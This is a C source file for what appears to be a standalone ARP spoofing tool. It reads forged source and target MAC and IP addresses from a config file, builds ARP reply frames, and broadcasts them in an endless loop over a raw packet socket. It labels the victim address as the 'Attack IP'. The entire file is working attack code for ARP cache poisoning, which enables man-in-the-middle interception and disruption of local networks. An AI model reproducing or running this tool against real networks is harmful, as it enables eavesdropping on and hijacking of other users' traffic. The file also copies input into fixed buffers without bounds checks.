#include <stdio.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>
#include <stdint.h>
#include <memory.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>
#define ARPLEN         (60)
#define MACSTRLEN   (18)
#define IPSTRLEN     (16)
#define ETHNAMELEN (6)
char DHOSTMAC[MACSTRLEN];
char SHOSTMAC[MACSTRLEN];
char DHOSTIP[IPSTRLEN];
char SHOSTIP[IPSTRLEN];
char ETHNAME[ETHNAMELEN];
extern   char *optarg;
static void
InitArp(struct ether_arp *ether_arp)
{
    (ether_arp->ea_hdr).ar_hrd = htons(ARPHRD_ETHER);
       (ether_arp->ea_hdr).ar_pro = htons(ETHERTYPE_IP);
       (ether_arp->ea_hdr).ar_hln = 6;
       (ether_arp->ea_hdr).ar_pln = 4;
       (ether_arp->ea_hdr).ar_op   = htons(ARPOP_REPLY);
       memcpy(ether_arp->arp_sha,
                     ether_aton(SHOSTMAC),
                     ETH_ALEN);
       memcpy(ether_arp->arp_tha,
                     ether_aton(DHOSTMAC),
                     ETH_ALEN);
       inet_pton(AF_INET,
                           SHOSTIP,
                           ether_arp->arp_spa
                           );
       inet_pton(AF_INET,
                           DHOSTIP,
                           ether_arp->arp_tpa
                           );
}
static void
InitEtherHeader(struct ether_header *ether_header)
{     
       
       memcpy( ether_header->ether_dhost,
                       ether_aton(DHOSTMAC),
                       ETH_ALEN);
       memcpy( ether_header->ether_shost,
                       ether_aton(SHOSTMAC),
                       ETH_ALEN
                       );
       ether_header->ether_type = htons(ETHERTYPE_ARP);
}
static void
readcfgfile(char *file_name)                                                                                                                                                                                                                                 
{
       FILE *fp = NULL;
#define MAXSIZE 255
       char buf[MAXSIZE];
       char *ptr;
       if((fp = fopen(file_name,"r")) == NULL)
       {
               perror("readcfgfile");
               exit(0);
       }
       while(fgets(buf,MAXSIZE,fp) != 0)
       {
               if(buf[0] == '#')
                       continue;
               if(strstr(buf,"SHOSTMAC=")){
                       u_int8_t len = strlen(buf);
                       if(buf[len - 1] == '\n')
                               buf[len - 1] = 0;
                       ptr = buf + strlen("SHOSTMAC=");
                       strcpy(SHOSTMAC, ptr);
               }else if(strstr(buf,"DHOSTMAC=")){
                       u_int8_t len = strlen(buf);
                       if(buf[len - 1] == '\n')
                               buf[len - 1] = 0;
                       ptr = buf + strlen("DHOSTMAC=");
                       strcpy(DHOSTMAC, ptr);
               }else if(strstr(buf,"SHOSTIP=")){
                       u_int8_t len = strlen(buf);
                       if(buf[len - 1] == '\n')
                               buf[len - 1] = 0;
                       ptr = buf + strlen("SHOSTIP=");
                       strcpy(SHOSTIP, ptr);
               }else if(strstr(buf,"DHOSTIP=")){
                       u_int8_t len = strlen(buf);
                       if(buf[len - 1] == '\n')
                               buf[len - 1] = 0;
                       ptr = buf + strlen("DHOSTIP=");                                                                                                                                                                                                   
                       strcpy(DHOSTIP, ptr);
                       printf("Attack IP is : %s\n",DHOSTIP);
               }else{                     printf("Parameter is error!!!\n");
                       exit(0);
               }
       }
#undef MAXSIZE
}
 
static u_int8_t
parse_args(u_int32_t argc,u_int8_t **argv)
{
       u_int8_t count = 0;
       register int op;
       const char *opts = "f:F:i:I:";
       while( (op = getopt(argc, argv, opts) ) != -1) switch(op) {
               case 'f':
               case 'F':
                       {
                               count++;
                               readcfgfile(optarg);
                               break;
                       }
               case 'i':
               case 'I':
                       {
                               count++;
                               memcpy(ETHNAME, optarg,strlen(optarg));
                               break;
                       }
               default:
                       break;
       }
       return count;
}
                                                                                                                                                                                                                                                                                         
int main(u_int32_t argc, u_int8_t **argv)
{
       u_int8_t   count = 0;       
       count = parse_args(argc,argv);
       if(count != 2)
       {
               printf("Please input the arp_file!!!!\n");
               exit(0);
       }
       u_int8_t *arp = (u_int8_t*)malloc(sizeof(char) * ARPLEN);
       memset(arp, 0 , ARPLEN);
       struct ether_header *ether_header = (struct ether_header*)(arp);
       struct ether_arp       *ether_arp = (struct ether_arp*)(arp + sizeof(struct ether_header));
       InitEtherHeader(ether_header);
       InitArp(ether_arp);
       
       //bind   socket
       int32_t fd;
       if((fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
       {
               perror("socket error!!\n");
               exit(0);
       }
       struct sockaddr_ll send;
       memset(&send, 0 ,sizeof(send));
       send.sll_family = PF_PACKET;
       send.sll_ifindex = if_nametoindex(ETHNAME);
       u_int32_t pkt_num = 0;
       while(1){
               sendto(fd, arp , ARPLEN, 0, (struct sockaddr*)&send, sizeof(send));
               pkt_num++;
               printf("<<<<<Send %d packet>>>>>\n", pkt_num);
               sleep(5);
    }
}

